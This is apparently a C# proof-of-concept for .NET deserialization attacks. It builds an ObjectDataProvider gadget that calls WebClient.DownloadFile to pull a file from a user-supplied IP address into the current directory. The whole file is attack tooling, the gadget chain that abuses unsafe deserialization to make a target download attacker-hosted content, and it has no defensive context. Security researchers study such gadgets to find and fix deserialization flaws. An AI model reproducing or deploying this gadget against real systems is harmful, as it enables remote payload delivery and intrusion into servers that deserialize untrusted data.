using System;
using System.IO;
using System.Windows.Data;
using System.Net;
using System.Runtime;
using System.Collections;
using System.Xml.Serialization;
namespace ODPSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            if(args.Length != 2) {
                System.Console.WriteLine("Usage: odp-serializer ip file");
                Environment.Exit(1);
            }
            String ip = args[0];
            String file = args[1];
            String url = "http://" + ip + "/";
            ObjectDataProvider myODP = new ObjectDataProvider();
            myODP.ObjectInstance = new System.Net.WebClient();
            myODP.MethodName = "DownloadFile";
            myODP.MethodParameters.Add(url);
            // Download to current directory
            myODP.MethodParameters.Add(file);
            Console.WriteLine("Done!");
        }
    }
}